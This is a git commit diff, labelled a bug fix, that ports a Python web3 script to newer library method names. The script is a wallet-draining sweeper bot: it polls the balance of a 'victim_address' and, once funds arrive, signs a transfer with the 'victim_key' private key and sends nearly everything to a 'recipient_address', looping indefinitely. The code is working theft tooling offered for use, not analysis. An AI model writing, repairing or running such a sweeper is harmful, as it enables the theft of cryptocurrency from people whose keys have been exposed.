234a43103ed2903eedad0345f44f2d6c510587ce
sobhan shokri <xd3vman@gmail.com>
2024-06-18 23:17:04 +0330

    fix bugs: web3 library syntax error fixed

--- main.py
+++ main.py
@@ -8,12 +8,13 @@ from decimal import *
 from config import *
 
 if ganache_mode:
-    web3 = Web3(Web3.HTTPProvider(ganache_url))
+    W3 = w3 = Web3(Web3.HTTPProvider(ganache_url))
+    # W3 = Web3(Web3.HTTPProvider(ganache_url))
 else:
-    web3 = Web3(Web3.HTTPProvider(infura_url))
+    W3 = Web3(Web3.HTTPProvider(infura_url))
 
-# check connecting web3 to Ganache
-if  web3.isConnected() == True:
+# check connecting W3 to Ganache
+if  W3.is_connected() == True:
     print("started")
 else :
     print("error connecting...")
@@ -22,7 +23,8 @@ balance=0
 
 gas_fee = 21000*56  # You can change gasfee value
 gas_fee = Decimal(gas_fee)
-gas_fee = web3.fromWei(gas_fee,'Gwei')
+gas_fee = W3.from_wei(gas_fee,'Gwei')
+
 print("gas fee is : ", gas_fee)
 def get_balance_loop():
     balance=0
@@ -30,16 +32,17 @@ def get_balance_loop():
         while 0.0005>balance:
             #Get balance account
             try:
-                balance = web3.eth.getBalance(victim_address)
-                balance = web3.fromWei(balance, "ether") #convert to ether value
+                balance = W3.eth.get_balance(victim_address)
+                balance = W3.from_wei(balance, "ether") #convert to ether value
             except:
                 print("error , i can't get balance...")
+                
 
         try:
             balance = balance-gas_fee
             print("ETH balance: ",balance)
             # print(balance)
-            # print(web3.fromWei(balance, "ether"))
+            # print(W3.fromWei(balance, "ether"))
             build_transaction(balance)
         except:
             print("Error, check balance and Gasfee again")
@@ -49,23 +52,24 @@ def get_balance_loop():
 def build_transaction(balance):
     try:
         #get nonce number
-        nonce = web3.eth.getTransactionCount(victim_address)
+        nonce = w3.eth.get_transaction_count(victim_address)
+        
         #build transaction
         tx = {
             'nonce':nonce,
             'to':recipient_address,
-            'value':web3.toWei(balance,'ether'),
+            'value':W3.to_wei(balance,'ether'),
             'gas':21000,
-            'gasPrice':web3.toWei('56','gwei')
-        }
+            'gasPrice':W3.to_wei('56','gwei')
+        } 
 
         #sign transaction with private key
-        signed_tx = web3.eth.account.signTransaction(tx,victim_key)
+        signed_tx = W3.eth.account.sign_transaction(tx,victim_key)
         
         #send Transaction
-        tx_hash= web3.eth.sendRawTransaction(signed_tx.rawTransaction)
-
-        print(web3.toHex(tx_hash))
+        tx_hash= W3.eth.send_raw_transaction(signed_tx.rawTransaction)
+        
+        print(W3.to_hex(tx_hash))
         print("Transaction Completed\n GET Balance Again...")
         get_balance_loop()
     except:
